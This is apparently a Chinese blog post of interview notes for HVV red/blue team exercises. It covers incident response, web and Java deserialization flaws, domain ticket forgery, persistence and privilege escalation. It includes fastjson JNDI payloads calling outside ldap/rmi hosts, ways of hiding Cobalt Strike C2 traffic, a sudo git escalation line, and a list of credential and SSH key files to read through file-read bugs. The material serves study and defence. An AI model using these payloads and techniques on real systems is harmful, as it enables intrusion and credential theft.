

本人自己没时间写总结博客，所以窃取大佬的hvv总结博客:https://www.cnblogs.com/Rlins/p/16873560.html  (狗头)



- [1.设备误报处理：](#1设备误报处理)
- [2.如何查看区分是扫描流量和手动流量](#2如何查看区分是扫描流量和手动流量)
- [3.被拿shell了如何处理](#3被拿shell了如何处理)
- [4CSRF](#4csrf)
- [5.XXE](#5xxe)
- [6.SSRF](#6ssrf)
- [7.应急响应](#7应急响应)
- [8.溯源](#8溯源)
- [9.反制](#9反制)
- [10.内网渗透](#10内网渗透)
- [11.挖矿](#11挖矿)
- [12.内网](#12内网)
- [13.域控定位](#13域控定位)
- [14.tomcat](#14tomcat)
- [15.log4j](#15log4j)
- [16.Spring core RCE](#16spring-core-rce)
- [17.SQL注入](#17sql注入)
- [18.XSS](#18xss)
- [19.shiro](#19shiro)
- [20.Weblogic](#20weblogic)
- [21fastjson](#21fastjson)
- [22.Struts2](#22struts2)
- [23.Webshell](#23webshell)
- [24.反弹shell不出网](#24反弹shell不出网)
- [25.CS上线隐藏](#25cs上线隐藏)
- [26.CS流量特征](#26cs流量特征)
- [27.sqlmap流量特征](#27sqlmap流量特征)
- [29.0day](#290day)
- [30.工作经历](#30工作经历)
- [31.简历有护网经历，你能谈谈护网的情况吗](#31简历有护网经历你能谈谈护网的情况吗)
- [32.一台主机在内网进行横向攻击，你应该怎么做？](#32一台主机在内网进行横向攻击你应该怎么做)
- [33.JAVA反序列化](#33java反序列化)
- [34.内网票据](#34内网票据)
- [35.权限维持](#35权限维持)
- [36.JAVA框架](#36java框架)
- [38.Windows常用的提权方法](#38windows常用的提权方法)
- [39.Linux常用提权](#39linux常用提权)
- [4mysql](#4mysql)
- [41.空间测绘](#41空间测绘)
- [42.威胁情报](#42威胁情报)
- [43.正向代理和反向代理的区别](#43正向代理和反向代理的区别)
- [44.常见的中间件漏洞？](#44常见的中间件漏洞)
- [45.内网渗透思路？](#45内网渗透思路)
- [46.linux比较重要的目录](#46linux比较重要的目录)
- [47.常用端口](#47常用端口)
- [48.windows日志事件ID](#48windows日志事件id)
- [49.Windows和Linux的日志文件放在哪里](#49windows和linux的日志文件放在哪里)
- [50.常见中间件的配置文件路径](#5常见中间件的配置文件路径)
- [51.如何修改WEB端口？如果不能修改端口还有什么利用方法？](#51如何修改web端口如果不能修改端口还有什么利用方法)
- [52.获得文件读取漏洞，通常会读哪些文件，Linux和windows都谈谈](#52获得文件读取漏洞通常会读哪些文件linux和windows都谈谈)
- [53.如何分析被代理出来的数据流](#53如何分析被代理出来的数据流)



### 1.设备误报处理：

查看日志

防止：记录正常业务服务的签名, 防止误报

### 2.如何查看区分是扫描流量和手动流量

扫描数据量大，请求有规律，手动扫描间隔较少

### 3.被拿shell了如何处理

排查、清除、关站、看看可有即使修复的可能，没有可能就关站

### 4CSRF

挟持用户在当前已登录的Web应用程序上执行非本意的操作

防范：验证HTTP Referer字段;在请求地址中添加token并验证

### 5.XXE

应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件（防范：禁止外部实体解析，通过黑名单过滤用户提交的XML数据）

xxe的检测----插入xml脚本代码

### 6.SSRF

 web应用都提供了从其他的服务器上获取数据的功能。使用指定的URL，web应用便可以获取图片，下载文件，读取文件内容等

 采取白名单,限制内网Ip。对返回内容进行识别禁用一些不必要的协议统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态过滤函数，file_get_contents fsockopen() curl_exec()

### 7.应急响应

查看日志详细信息、判断被攻击类型、找到被攻击点、处置、输出报告

应急思路：首先通过安全设备拦截攻击包体和日志分析，了解攻击者具体进行了什么样的攻击，通过黑白结合模拟方法进一步判断攻击者的攻击方式。复现之后对漏洞进行修复，对攻击者进行溯源。

windows排查：系统账户、端口进程、启动项、计划任务、查杀、日志分析（4624成功、4625失败）

linux排查：账户、历史命令、端口、启动项、日志（lastlog最近登录、secure验证、btmp失败）

### 8.溯源

查看日志详细信息，分析攻击IP、查看IP的whois信息、信息收集

溯源思路：首先通过系统日志、安全设备截获攻击包等从中分析出攻击者的ip和攻击方式，通过webshell或者木马去微步分析，或者去安恒威胁情报中心进行ip检测分析，是不是云服务器，基站等，如果是云服务器的话可以直接反渗透，看看开放端口，域名，whois等进行判断，获取姓名电话等丢社工库看看能不能找到更多信息然后收工

跳板机溯源：

windows（security或者rdp日志的ip信息、网络连接、进程、浏览器记录、密码管理器、代理日志）

linux（进程、网络连接、日志、代理日志）

### 9.反制

wifi反制：近源渗透（蜜罐wifi、弱密码、钓鱼页面、修改host跳转钓鱼页面）

CS4.0-4.4反制、MSF生成shellcode、dnslog/httplog、Goby 反制、蚁剑反制、AWVS、BURP、SQLMAP、XSS钓鱼、蜜罐

### 10.内网渗透

提权、代理穿透、信息收集、纵横向、域控

### 11.挖矿

隔离主机、排查（top资源占用、开机启动、任务计划、端口开放）、清除

### 12.内网

内网横移：IPC、WMI、SMB、msf密码喷射、PTP（ms14-068）

内网报警：定位报警>打补丁>木马查杀>分析流量>微补查询> whois>社工

### 13.域控定位

ipconfig /all systeminfo、net config workstation

### 14.tomcat

实现内存马：加载注册filter

漏洞：任意文件上传，文件包含，未授权，弱口令，war后门上传

### 15.log4j

日志中包含 `${}`,lookup功能就会将表达式的内容替换为表达式解析后的内容，而不是表达式本身。

### 16.Spring core RCE

利用class对象构造利⽤链，对Tomcat的日志配置进行修改，然后，向⽇志中写⼊shell

### 17.SQL注入

 原理：sql注入的原理是将sql代码伪装到输入参数中，传递到服务器解析并执行的一种攻击手法。

 防御：预编译；检测id数据类型；过滤用户的输入

 宽字节注入：数据库GBK编码

 报错注入：updatexml、extractvalue、floor、exp

 布尔注入：length、substr、mid、ascii、ord 流程：判断数据库长度>库名>表总>表长>表名>段长>段名

 堆叠：；拼接多语句执行

 sql盲注的优化知道吗？二分法，或者load_file用UNC路径发起请求，走smb服务，用dnslog来显示

### 18.XSS

 原理：通过添加或修改页面JavaScript的恶意脚本，在浏览器渲染页面的时候执行该脚本，从而实现窃取cookie或者调用Ajax实现其他类型的CSRF。

### 19.shiro

 关键字rememberMe=deleteMe

 利用：出网>反弹、不出网>写shell

 原理：用户登陆成功后会生成经过加密并编码的cookie，在服务端接收cookie值后，Base64解码–>AES解密–>反序列化。攻击者只要找到AES加密的密钥，就可以构造一个恶意对象，对其进行序列化–>AES加密–>Base64编码，然后将其作为cookie的rememberMe字段发送，Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞

 550：Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。

在 Apache Shiro<=1.2.4 版本中 AES 加密时采用的 key 是硬编码在代码中

 721：由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。

相较于550而言，它不需要知道key的值，但是它需要一个合法用户的rememberMe cookie

 出网协议：jndi、ldap、rmi、JRMP、JMX、JMS

### 20.Weblogic

T3原理：利用RMI（远程方法调用） 机制的缺陷，通过 JRMP 协议（Java远程方法协议）达到执行任意反序列化代码，进而造成远程代码执行。

CVE-2014-4210：SSRF、SearchPublicRegistries.jsp页面使用远程服务器

CVE-2017-10271：WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞

CVE-2018-2894：未授权的两个页面存在任意上传getshell漏洞，可直接获取权限。/ws_utc/begin.do，/ws_utc/config.do

CVE-2019-2618：弱口令+文件上传

CVE-2018-2628：利用其他rmi绕过weblogic黑名单限制，然后在将加载的内容利用readObject解析，从而造成反序列化

CVE-2020-14882：构造特殊的HTTP请求，在未经身份验证的情况下接管 WebLogic Server Console，并在 WebLogic Server Console 执行任意代码。

CVE-2020-14883：未授权访问得到管理员界面

CVE-2020-2551：类似于RMI反序列化漏洞（CVE-2017-3241），都是由于调用远程对象的实现存在缺陷，导致序列化对象任意构造

组合拳：14882+14883组合拳，14882做一个未授权访问，登到控制台，然后通过14883命令执行，写一个xml文件把命令写进去，让它去访问你的vps然后加载xml。

### 21fastjson

原理：攻击者可以传入一个恶意构造的JSON内容，程序对其进行反序列化后得到恶意类并执行了恶意类中的恶意函数，进而导致代码执行。

1.2.24：fastjson autotype在处理json对象的时候，未对@type字段进行完全的安全性验证

1.2.47：绕过白名单

1.2.41：增加了checkAutoType()函数，黑白名单访问，在原类名头部加L，尾部加;即可绕过黑名单的同时加载类。

1.2.42：类名外部嵌套两层L和;

1.2.45：{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"ldap://localhost:1389/Exploit"}}

1.2.47：loadClass中默认cache为true，利用分2步，首先使用java.lang.Class把获取到的类缓存到mapping中，然后直接从缓存中获取到了com.sun.rowset.jdbcRowSetlmpl这个类，绕过了黑名单机制。

1.2.62：{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://x.x.x.x:9999/exploit"}";

1.2.66：{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://192.168.80.1:1389/Calc"}

### 22.Struts2

原理：在处理action的时候，调用底层的getter/setter来处理http的参数，将每一个http的参数声明为一个ONGL，通过构造恶意代码被ONGL处理后，只要有权限就可以执行任何DOS命令

判断：请求以action结尾

029：OGNL表达式来访问ActionContext中的对象数据

032：启用动态方法调用

045：基于Jakarta插件的文件上传功能时，有可能存在远程命令执行

046：设置Content-Disposition的filename字段或者设置Content-Length超过2G

048：漏洞成因是当ActionMessage接收客户可控的参数数据时，由于后续数据拼接传递后处理不当导致任意代码执行

052：使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，可被远程攻击。

053：Freemarker解析一次之后变成离开一个表达式，被OGNL解析第二次

059：标签属性二次解析

062：针对059绕过加强OGNL表达式沙盒

devMode：devMode模式开启

### 23.Webshell

流量特征：

- 蚁剑

  可以对流量进行加密、混淆。但是有些关键代码没有被加密

  php ini_set、set_time_limit

  asp OnError ResumeNext，response

  蚁剑混淆加密后还有一个比较明显的特征，即为参数名大多以“_0x…=”这种形式

  每个请求体都存在@ini_set(“display_errors”, “0”);@set_time_limit(0)开头。并且存在base64等字符

  响应包的结果返回格式为 随机数 结果 随机数

- 冰蝎

  1. content-type
  2. Accept&Cache-Control
  3. 内置16个ua头
  4. content-length请求长度

- 菜刀

  2014 伪造UA头

  函数分割 base加密

- 哥斯拉

  php 请求都含有"pass="第一个包

  jsp 含有"pass="而且发起连接时服务器返回的Content-Length是0

  内存马如何排查：

 1、如果是jsp注入，日志中排查可以jsp的访问请求。

 2、如果是代码执行漏洞，排查中间件的error.log,查看是否有可疑的报错，判断注入时间和方法。

 3、根据业务使用的组件排查可能存在的java代码执行漏洞，spring的controller了类型的话根据上报webshell的url查找日志，filter或者listener类型，可能会有较多的404但是带有参数的请求。

### 24.反弹shell不出网

 nc反弹、psexec、Neo-reGeorg代理、（ICMP、dns、http协议隧道）

### 25.CS上线隐藏

代理转发上线，DNS上线，CDN上线，域前置上线，云函数上线

 1、 DNS上线

 一般我们拿到的shell都是，对出网有限制的，一般只能DNS出网，这时候就要用到我们 DNS 协议建立 C2 通信。一般waf不会分析DNS流量，这一点也是能够隐蔽的特性。

 DNS_TXT隧道传输：控制端发送的对目标的操作命令被加密后通过DNS的TXT记录里，通过DNS隧道传输隐蔽性较强不易被发现，但传输速度非常慢。

 2、 CDN上线

 CDN的IP是多个域名共用的，为了做到精确判断，CDN会解析我们的host头，根据这样的方式进行判断通信域名，这样我们设置上线IP设置为CDN服务器的IP，host设置为我们的DNS，达到隐藏IP的需求

 3、 云函数上线

 云函数还是得益于Serverless架构，或者称为无服务器架构，是最近几年新冒出来的一种架构风格，仅需用户编写和上传核心业务代码，交由平台完成部署、调度、流量分发、弹性伸缩等能力。

 我们就可以利用云函数，配置个流量转发，C2Client访问云函数，云函数将流量转发到咱们的C2服务器，一般云函数服务器都会配置CDN，这样速度还行，还可以达对C2服务器的隐藏。

### 26.CS流量特征

默认端口 50050

store证书特征 Alias name、Owner、Issuer字段 默认密码123456

0.0.0.0是Cobalt Strike DNS Beacon特征

### 27.sqlmap流量特征

- sqlmap的关键字特征：user-agent、 xss测试语句、随机数的位数
- sqlmap的攻击流程具有一定的顺序和规律
- sqlmap的一些payload测试语句具有模板特征

28socks代理能不能去ping

不能，介于传输层和会话层之间，用tcp传输数据，不支持icmp，不能用ping命令

### 29.0day

确定存在真实攻击行为，在客户允许的情况下，可以采取断网隔离措施，不行就采取白名单连接防火墙策略

看告警、确定资产，poc复现、确认是否攻击成功

### 30.工作经历

安全服务工程师

参加渗透测试、地方服务、HW

根据客户方要求对所给资产进行了详细细致的渗透测试。挖掘漏洞，发现漏洞的第一时间与客户方汇报，使客户方能够及时整改修补问题漏洞，防止造成漏洞危害扩大

### 31.简历有护网经历，你能谈谈护网的情况吗

参加过护网蓝队，负责事件研判工作，主要使用 ips，ids 等设备做流量监控与日志分析工作判断安全事件是否为误判

监控、研判、处置、溯源

对安全管理中心发出的态势排查单进行排查，并将排查结果反馈给安全管理中心，对安全管理中心发出的封堵工单和解封工单进行对应的封堵与解封，每两小时反馈一次排查结果、设备巡检报告、封堵情况。查看呼池 DDOS 设备，记录并排查告警信息

### 32.一台主机在内网进行横向攻击，你应该怎么做？

确定攻击来源，是不是员工内部误操作，比如询问运维是否有自动化轮训脚本

如果没有，确定是攻击，结合时间点，根据设备信息，看一下安全事件，进程，流量

找到问题主机，开始应急响应流程：准备、检测、遏制、根除、恢复、跟踪，具体的操作要交给现场运维去处理

### 33.JAVA反序列化

Java的反射机制为Java开发工程师提供了许多便利，同样也带来了潜在的安全风险，反射机制的存在使得我们可以越过Java本身的静态检查和类型约束，在运行期直接访问和修改目标对象的属性和状态。

Java反射的四大核心：Class，Constructor，Field，Method

Java反序列化漏洞中目前只能传输一个对象的属性与状态，而不是字节码，因此需要使用Java的反射技术将代码的意图进行掩盖，以确保恶意代码能传输到目标服务器上，依托Java本身的特性，将恶意代码包装到一个正常的调用流程里，使得在被触发的时候执行恶意的代码逻辑。

- Java 序列化是指把 Java 对象转换为字节序列的过程便于保存在内存、文件、数据库中，ObjectOutputStream 类的 writeObject() 方法可以实现序列化。

- Java 反序列化是指把字节序列恢复为 Java 对象的过程，ObjectInputStream 类的 readObject() 方法用于反序列化。

- 331序列化

  把对象转化为可传输的字节序列过程称为序列化

- 332反序列化

  把字节序列还原为对象的过程称为反序列化

  常见漏洞：shiro、fastjson、weblogic、jboss、rmi

### 34.内网票据

黄金票据：是指通过伪造TGT，来进行下一步的Kerberos认证，从而获取到访问服务器的ST。实际上只要拿到了域控权限，就可以直接导出krbtgt的Hash值，，再通过mimikatz即可生成任意用户任何权限的Ticket。

 原理：AS应答Client时，会返回TGT、使用KDC生成的Client密钥加密KDC生成的Client/TGS SessionKey

 制作条件：域名称、域SID、域KRBTGT账户密码HASH、伪装的用户名

防御：限制域管理员登录到除域控制器和少数管理服务器以外的任何其他计算机（不要让其他管理员登录到这些服务器）将所有其他权限委派给自定义管理员组。

白银票据：是通过伪造ST获得权限，但因为所访问的对象在TGT中通过SID指定了，所以通过白银票据只能访问特定的服务。

 原理：在TGS应答Client，会发送ST、使用Client/TGS SessionKey加密的Client/Server SessionKey。只要我们获得了对应Server的Hash，则可以伪造出自己的ST，从而访问特定服务（之所以是特定，是因为pac只能KDC制作和查看,我们无法伪造pac，所以只能访问不验证pac的服务，如cifs）。

 制作条件：域名称、SID、目标主机、服务名称、目标主机hash值、任意用户名、ptt内存导入

 特点：白银票据不经过域控、只能访问不验证pac的服务

增强版黄金票据：普通黄金票据不能跨域，只能在当前域使用，不能跨域，包括子域对父域的跨域。

 制作：通过域内主机在迁移时LDAP库中的SIDHistory属性中保存的上一个域的SID值制作可以跨域的金票。如果知道根域的SID那么就可以通过子域的KRBTGT的HASH值，使用mimikatz创建具有 EnterpriseAdmins组权限（域林中的最高权限）的票据。

### 35.权限维持

Linux：crontab定时任务、ssh后门，进程注入，hook密码校验函数得到管理员密码、修改管理员二进制文件创建链接，使管理员在输入ls或者cd等这种命令的时候执行恶意脚本、pam后门、开机启动脚本

windows：隐藏用户、计划任务、开机自启、服务后门、黄金白银票据、DLL劫持

### 36.JAVA框架

Apache Shiro、Spring Security、Struts2、Fastjson、jackson、rmi、weblogic、jboss

37内网横向

$IPC、Psexec、WMI、Schtasks、AT、SC、WINRM

扩展具体方法：密码喷洒、IPC$、WMI、mimikatz、PTH、MS14-068、web漏洞、系统漏洞

命令：psexec，wmic，smbexec，winrm，net use共享+计划任务+type命令

### 38.Windows常用的提权方法

土豆全家桶、systeminfo提权辅助页面、注册表提权

系统漏洞提权

sc 命令提权（administrator–>system）

不带引号的服务路径

不安全的服务权限提升

绕过系统 UAC 提升

### 39.Linux常用提权

脏牛、suid、find命令、rbash，git提权，sudoer提权

1.uid提权 (find / -perm -u=s -type f 2>/dev/null)
2.（sudo git help config !/bin/bash或者！'sh'完成提权）
3、脏牛提权
4、内核提权
5、环境劫持
6、suid提权
7、cve-2021-4034
8、docker提权

### 4mysql

1. UDF提权

   UDF(User Defined Funtion)用户自定义函数，通过添加新的函数，对mysql服务器进行功能扩充。

2. MOF加载提权

   利用了C:WindowsSystem32wbemMOF目录下的nullevt.mof文件每分钟会去执行一次的特性，向该文件中写入cmd命令，就会被执行

3. 启动项重启提权

4. 反弹shell

写马与提权前提

 secure_file_priv路径不限制、DBA权限、目录可写、知网站绝对路径、`PHP`的`GPC`为 off状态

### 41.空间测绘

fofa、zoomeye、360、鹰图

### 42.威胁情报

微步、奇安信威胁情报

### 43.正向代理和反向代理的区别

正向代理：当客户端无法访问外部资源的时候（比如Google、YouTube），可以通过一个正向代理去间接地访问。

反向代理：客户端是无感知代理的存在，以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端。此时代理服务器对外就表现为一个服务器

44正向 SHELL 和反向 SHELL 的区别

正向Shell：攻击者连接被攻击者机器，可用于攻击者处于内网，被攻击者处于公网的情况。
反向Shell：被攻击者主动连接攻击者，可用于攻击者处于外网，被攻击者处于内网的情况。

### 44.常见的中间件漏洞？

- IIS（PUT、短文件名猜解、远程代码执行、解析漏洞）
- Apache（解析漏洞、目录遍历）
- nginx（文件解析、目录遍历、CRLF注入、目录穿越）
- tomcat（远程代码执行、war后门部署）
- jboss（反序列化、任意文件上传、war后门）

### 45.内网渗透思路？

1. 代理穿透
2. 权限维持
3. 内网信息收集
4. 口令爆破
5. 凭据窃取
6. 社工
7. 横行和纵向渗透
8. 拿下域控

### 46linux比较重要的目录

首先是日志，/var/log里面的message保存了比较重要的信息，一般出问题了登上去首先会去看这里。
还有lastb查看登录错误的日志，last查看所有的登录日志，lastlog查看最后一次登录的日志，
还有/var/log/secure记录了验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权。
home目录下面有个.bash_history，如果etc/passwd发现有新增的可疑用户的话会去看一下，他记录了历史命令。
var/spool/cron里面有计划任务，留后门的话有可能会定时反弹shell。
home/用户名/ssh 记录了ssh公钥，查看有没有被留后门。
etc/rc.local开机自启动。
面试官：临时文件在哪个目录？
var/tmp

### 47常用端口

21 ftp

22 ssh

23 telnet

80 http

445 smb

1433 mssql

1521 Oracle

3306 mysql

6379 redis

7001 weblogic

8080 tomcat、jboss

27017 mongodb

### 48windows日志事件ID

| 事件ID | 说明           |
| :----- | :------------- |
| 4624   | 登陆成功       |
| 4625   | 登陆失败       |
| 4634   | 注销成功       |
| 4647   | 用户启动的注销 |
| 4672   | 使用管理员登陆 |
| 4720   | 创建用户       |

### 49Windows和Linux的日志文件放在哪里

- Windows 主要有以下三类日志记录系统事件：应用程序日志、系统日志和安全日志

系统日志：`%SystemRoot%System32WinevtLogsSystem.evtx`

应用程序日志：`%SystemRoot%System32WinevtLogsApplication.evtx`

安全日志：`%SystemRoot%System32WinevtLogsSecurity.evtx`

Linux

日志默认存放位置：`/var/log/` 查看日志配置情况：more /etc/rsyslog.conf

### 5常见中间件的配置文件路径

- apache：`/etc/httpd/conf`
- nginx：`/etc/nginx`
- iis7：`C:WindowsSystem32inetsrvconfig`

### 51如何修改WEB端口？如果不能修改端口还有什么利用方法？

修改 web 端口：修改中间件配置文件中的 web 服务端口即可

不能修改的话可以使用端口映射，使用 nginx 反向代理也可以

### 52.获得文件读取漏洞，通常会读哪些文件，Linux和windows都谈谈

通用

- 找 Web 应用的配置文件，指不定有外联数据库
- 找 Web 中间件的配置文件，指不定有 Tomcat 配置界面的用户密码
- 找系统文件

linux

- `etc/passwd、etc/shadow`直接读密码
- `/etc/hosts` # 主机信息
- `/root/.bashrc` # 环境变量
- `/root/.bash_history` # 还有root外的其他用户
- `/root/.viminfo` # vim 信息
- `/root/.ssh/id_rsa` # 拿私钥直接ssh
- `/proc/xxxx/cmdline` # 进程状态枚举 xxxx 可以为0000-9999 使用burpsuite
- 数据库 config 文件
- web 日志 `access.log, error.log`
- ssh 日志



```
bash /root/.ssh/id_rsa /root/.ssh/id_rsa.pub /root/.ssh/authorized_keys /etc/ssh/sshd_config /var/log/secure /etc/sysconfig/network-scripts/ifcfg-eth0 /etc/syscomfig/network-scripts/ifcfg-eth1
```

- `/var/lib/php/sess_PHPSESSID` # 非常规问题 session 文件( 参考 平安科技的一道session包含 [http://www.jianshu.com/p/2c24ea34566b](https://link.zhihu.com/?target=http%3A//www.jianshu.com/p/2c24ea34566b))

windows

- `C:boot.ini` //查看系统版本
- `C:WindowsSystem32inetsrvMetaBase.xml` //IIS 配置文件
- `C:Windowsrepairsam` //存储系统初次安装的密码
- `C:Program Filesmysqlmy.ini` //Mysql 配置
- `C:Program Filesmysqldatamysqluser.MY D` //Mysql root
- `C:Windowsphp.ini` //php 配置信息

### 53.如何分析被代理出来的数据流

分析数据包请求头中的 xff、referer 等收集有用的信息

设备：

- 运维审计和管理平台（堡垒机）
- DAS：数据库安全审计平台
- LAS：日志审计安全平台
- AC：上网行为管理系统
- 伪装欺骗系统（蜜罐、蜜网）
- SIP：安全态势感知平台
- IPS：入侵防御系统
- AV：反病毒系统
- EDR：主机安全管理终端检测和响应
- IDS：入侵检测
- NGAF/NGFW：防火墙
